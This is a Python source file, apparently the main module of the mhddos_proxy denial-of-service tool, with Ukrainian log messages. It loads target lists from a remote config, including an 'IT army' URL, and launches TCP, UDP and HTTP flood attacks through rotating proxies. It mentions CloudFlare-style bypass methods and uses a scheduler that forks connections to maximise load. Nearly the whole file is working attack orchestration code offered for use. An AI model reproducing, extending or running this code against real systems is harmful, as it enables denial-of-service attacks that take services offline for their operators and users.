# @formatter:off
import colorama; colorama.init()
# @formatter:on
import asyncio
from asyncio import events
from functools import partial
import selectors
import socket
import sys
import time
from threading import Event, Thread
from typing import List, Union

from src.cli import init_argparse
from src.concurrency import safe_run
from src.core import (
    logger, cl, Stats,
    LOW_RPC, IT_ARMY_CONFIG_URL, REFRESH_OVERTIME, REFRESH_RATE, ONLY_MY_IP,
    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
)
from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood, AttackSettings
from src.output import show_statistic, print_banner
from src.proxies import ProxySet
from src.system import fix_ulimits, is_latest_version
from src.targets import Target, TargetsLoader


WINDOWS = sys.platform == "win32"
WINDOWS_WAKEUP_SECONDS = 0.5

AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]


class GeminoCurseTaskSet:

    def __init__(
        self,
        loop,
        runnables,
        initial_capacity: int = 2,
        max_capacity: int = 10_000,
        fork_scale: int = 2,
        failure_delay: int = 0.25
    ):
        self._loop = loop
        self._tasks = runnables
        self._initial_capacity = initial_capacity
        self._max_capacity = max_capacity
        self._fork_scale = fork_scale
        self._pending = set()
        self._failure_delay: float = failure_delay
        self._shutdown_event = asyncio.Event()

    def _on_connect(self, runnable, f):
        try:
            if f.result() and len(self) <= self._max_capacity - self._fork_scale:
                for _ in range(self._fork_scale):
                    self._launch(runnable)
        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    def _on_finish(self, runnable, f):
        self._pending.remove(f)
        try:
            f.result()
        except asyncio.CancelledError as e:
            return
        else:
            self._launch(runnable)

    def __len__(self) -> int:
        return len(self._pending)

    def _launch(self, runnable) -> None:
        if self._shutdown_event.is_set(): return
        on_connect = self._loop.create_future()
        on_connect.add_done_callback(partial(self._on_connect, runnable))
        task = self._loop.create_task(runnable.run(on_connect))
        task.add_done_callback(partial(self._on_finish, runnable))
        self._pending.add(task)

    async def loop(self) -> None:
        # the algo:
        # 1) for each runnable launch {initial_capacity} tasks
        # 2) as soon as connection ready on any of them, fork runner
        #    if max_capacity is enough
        # 3) on finish, restart corresponding runner
        #
        # potential improvement: find a way to downscale
        assert not self._shutdown_event.is_set(), "Can only be used once"
        try:
            for runnable in self._tasks:
                for _ in range(self._initial_capacity):
                    self._launch(runnable)
            while not self._shutdown_event.is_set():
                await asyncio.sleep(WINDOWS_WAKEUP_SECONDS)
        except asyncio.CancelledError as e:
            self._shutdown_event.set()
            for task in self._pending:
                task.cancel()
            raise e


# XXX: this is going to be used for UDP tasks only, maybe it's better
#      to rename it properly
class FloodTaskSet:

    def __init__(self, loop: asyncio.AbstractEventLoop, runnable: AsyncFlood, scale: int = 1):
        self._loop = loop
        self._runnable = runnable
        self._scale = scale
        self._failure_budget = scale * FAILURE_BUDGET_FACTOR
        self._failure_budget_delay = FAILURE_DELAY_SECONDS

    def _launch_task(self) -> asyncio.Task:
        return self._loop.create_task(safe_run(self._runnable.run))

    # XXX: reimplement this algorithm for attacks scheduling
    #      as it consumes too much resources for dead targets while
    #      being unfairly slow to those cases where we caught problems
    #      because of proxies
    async def loop(self) -> None:
        try:
            tasks = set(self._launch_task() for _ in range(self._scale))
            num_failures = 0
            while tasks:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                for f in done:
                    num_failures += int(not f.result())
                    if num_failures >= self._failure_budget:
                        await asyncio.sleep(self._failure_budget_delay)
                        num_failures = 0
                    pending.add(self._launch_task())
                tasks = pending
        except asyncio.CancelledError as e:
            for t in tasks:
                t.cancel()
            raise e


async def run_ddos(
    proxies: ProxySet,
    targets_loader: TargetsLoader,
    attack_settings: AttackSettings,
    reload_after: int,
    http_methods: List[str],
    debug: bool,
    table: bool,
    total_threads: int,
    use_my_ip: int,
    initial_capacity: int,
    fork_scale: int,
    failure_delay: float,
):
    loop = asyncio.get_event_loop()
    statistics = {}

    # initial set of proxies
    if proxies.has_proxies:
        num_proxies = await proxies.reload()
        if num_proxies == 0:
            logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
            exit()

    def prepare_flooder(target: Target, method: str) -> AsyncFlood:
        thread_statistics = Stats()
        sig = target.options_repr
        statistics[(target, method, sig)] = thread_statistics
        if target.has_options:
            target_rpc = int(target.option(Target.OPTION_RPC, "0"))
            settings = attack_settings.with_options(
                requests_per_connection=target_rpc if target_rpc > 0 else None,
                transport=target.option(Target.OPTION_TRANSPORT),
                high_watermark=target.option(Target.OPTION_HIGH_WATERMARK),
            )
        else:
            settings = attack_settings

        kwargs = {
            'url': target.url,
            'ip': target.addr,
            'method': method,
            'event': None,
            'stats': thread_statistics,
            'proxies': proxies,
            'loop': loop,
            'settings': settings,
        }
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (target.url.host, target.url.port, method)
            )
        return mhddos_main(**kwargs)

    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    if not (table or debug):
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        await asyncio.sleep(5)

    active_flooder_tasks = []
    tcp_task_group = None 

    async def install_targets(targets):
        nonlocal tcp_task_group

        # cancel running flooders
        if active_flooder_tasks:
            for task in active_flooder_tasks:
                task.cancel()
            active_flooder_tasks.clear()

        statistics.clear()

        tcp_flooders, udp_flooders = [], []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                udp_flooders.append(prepare_flooder(target, target.method or 'UDP'))
            # Method is given explicitly
            elif target.method is not None:
                tcp_flooders.append(prepare_flooder(target, target.method))
            # tcp://
            elif target.url.scheme == "tcp":
                tcp_flooders.append(prepare_flooder(target, 'TCP'))
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    tcp_flooders.append(prepare_flooder(target, method))
            else:
                logger.error(f"Unsupported scheme given: {target.url.scheme}")

        if tcp_flooders:
            tcp_task_group = GeminoCurseTaskSet(
                loop,
                runnables=tcp_flooders,
                initial_capacity=initial_capacity,
                max_capacity=total_threads,
                fork_scale=fork_scale,
                failure_delay=failure_delay,
            )
            task = loop.create_task(tcp_task_group.loop())
            active_flooder_tasks.append(task)
        else:
            tcp_task_group = None

        for flooder in udp_flooders:
            task = loop.create_task(FloodTaskSet(loop, flooder).loop())
            active_flooder_tasks.append(task)

    try:
        initial_targets, _ = await targets_loader.load(resolve=True)
    except Exception as exc:
        logger.error(f"{cl.RED}Завнтаження цілей завершилося помилкою: {exc}{cl.RESET}")
        initial_targets = []

    if not initial_targets:
        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
        exit()
    await install_targets(initial_targets)

    tasks = []

    async def stats_printer():
        cycle_start = time.perf_counter()
        while True:
            await asyncio.sleep(REFRESH_RATE)
            try:
                passed = time.perf_counter() - cycle_start
                num_proxies = len(proxies)
                show_statistic(
                    statistics,
                    table,
                    use_my_ip,
                    num_proxies,
                    None if targets_loader.age is None else reload_after - int(targets_loader.age),
                    passed > REFRESH_RATE * REFRESH_OVERTIME,
                )
                if tcp_task_group is not None:
                    logger.info(f"Task group size: {len(tcp_task_group)}")
            finally:
                cycle_start = time.perf_counter()

    # setup coroutine to print stats
    if debug or table:
        tasks.append(loop.create_task(stats_printer()))

    async def reload_targets(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                targets, changed = await targets_loader.load(resolve=True)
                if not changed:
                    logger.warning(
                        f"{cl.YELLOW}Перелік цілей не змінився - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                elif not targets:
                    logger.warning(
                        f"{cl.RED}Не знайдено жодної доступної цілі - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                else:
                    await install_targets(targets)
            except asyncio.CancelledError as e:
                raise e
            except Exception as exc:
                logger.warning(
                    f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення цілей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload targets
    tasks.append(loop.create_task(reload_targets(delay_seconds=reload_after)))

    async def reload_proxies(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                num_proxies = await proxies.reload()
                if num_proxies == 0:
                    logger.warning(
                        f"{cl.MAGENTA}Буде використано попередній список проксі{cl.RESET}")
            except asyncio.CancelledError as e:
                raise e
            except Exception:
                pass
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення проксей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload proxies
    if proxies is not None:
        tasks.append(loop.create_task(reload_proxies(delay_seconds=reload_after)))

    await asyncio.gather(*tasks, return_exceptions=True)


async def start(args, shutdown_event: Event):
    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
    print_banner(use_my_ip)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(f'{cl.RED}Робота методу {bypass} не гарантована{cl.RESET}')

    if args.rpc < LOW_RPC:
        logger.warning(
            f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
            f'через збільшення кількості перепідключень{cl.RESET}')

    is_old_version = not await is_latest_version()
    if is_old_version:
        logger.warning(
            f"{cl.RED}Доступна нова версія - рекомендовано оновитися{cl.RESET}: "
            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
        )

    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    # we are going to fetch proxies even in case we have only UDP
    # targets because the list of targets might change at any point in time
    proxies = ProxySet(args.proxies, use_my_ip)

    # XXX: for TCP flood high_watermark should be lower by default
    # (we need to send a lot of small packages rather than buffer data before drain)
    attack_settings = AttackSettings(
        requests_per_connection=args.rpc,
        transport=args.advanced_default_transport,
        dest_connect_timeout_seconds=10,
        drain_timeout_seconds=0.2,
        high_watermark=1024 << 2,  # roughly 4 packets (normally 1024 bytes on a single write)
        # note that "generic flood" attacks switch reading off completely
        reader_limit=1024 << 6,
    )

    # XXX: with the current implementation there's no need to
    # have 2 separate functions to setups params for launching flooders
    reload_after = 300
    await run_ddos(
        proxies,
        targets_loader,
        attack_settings,
        reload_after,
        args.http_methods,
        args.debug,
        args.table,
        args.threads,
        use_my_ip,
        args.scheduler_initial_capacity,
        args.scheduler_fork_scale,
        args.scheduler_failure_delay,
    )
    shutdown_event.set()


def _safe_connection_lost(transport, exc):
    try:
        transport._protocol.connection_lost(exc)
    finally:
        if hasattr(transport._sock, 'shutdown') and transport._sock.fileno() != -1:
            try:
                transport._sock.shutdown(socket.SHUT_RDWR)
            except ConnectionResetError:
                pass
        transport._sock.close()
        transport._sock = None
        server = transport._server
        if server is not None:
            server._detach()
            transport._server = None


def _patch_proactor_connection_lost():
    """
    The issue is described here:
      https://github.com/python/cpython/issues/87419

    The fix is going to be included into Python 3.11. This is merely
    a backport for already versions.
    """
    from asyncio.proactor_events import _ProactorBasePipeTransport
    setattr(_ProactorBasePipeTransport, "_call_connection_lost", _safe_connection_lost)


async def _windows_support_wakeup():
    """See more info here:
        https://bugs.python.org/issue23057#msg246316
    """
    while True:
        await asyncio.sleep(WINDOWS_WAKEUP_SECONDS)


def _handle_uncaught_exception(loop: asyncio.AbstractEventLoop, context):
    error_message = context.get("exception", context["message"])
    logger.debug(f"Uncaught event loop exception: {error_message}")


def _main(args, uvloop: bool, shutdown_event: Event) -> None:
    if uvloop:
        loop = events.new_event_loop()
    elif WINDOWS:
        _patch_proactor_connection_lost()
        loop = asyncio.ProactorEventLoop()
        # This is to allow CTRL-C to be detected in a timely fashion,
        # see: https://bugs.python.org/issue23057#msg246316
        loop.create_task(_windows_support_wakeup())
    elif hasattr(selectors, "DefaultSelector"):
        selector = selectors.DefaultSelector()
        loop = asyncio.SelectorEventLoop(selector)
    else:
        loop = events.new_event_loop()
    loop.set_exception_handler(_handle_uncaught_exception)
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start(args, shutdown_event))


if __name__ == '__main__':
    args = init_argparse().parse_args()

    uvloop = False
    if args.advanced_allow_uvloop:
        try:
            __import__("uvloop").install()
            uvloop = True
            logger.info(
                f"{cl.GREEN}'uvloop' успішно активований "
                f"(підвищенна ефективність роботи з мережею){cl.RESET}")
        except:
            logger.warning(
                f"{cl.MAGENTA}Вказано ключ '--advanced-allow-uvloop' "
                f"проте 'uvloop' бібліотека не встановлена.{cl.RESET} "
                f"{cl.YELLOW}Атака буде проведенна з використанням вбудобваних систем.{cl.RESET}")

    shutdown_event = Event()
    try:
        # run event loop in a separate thread to ensure the application
        # exists immediately after Ctrl+C
        Thread(target=_main, args=(args, uvloop, shutdown_event), daemon=True).start()
        # we can do something smarter rather than waiting forever,
        # but as of now it's gonna be consistent with previous version
        while True:
            shutdown_event.wait(WINDOWS_WAKEUP_SECONDS)
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
        sys.exit()
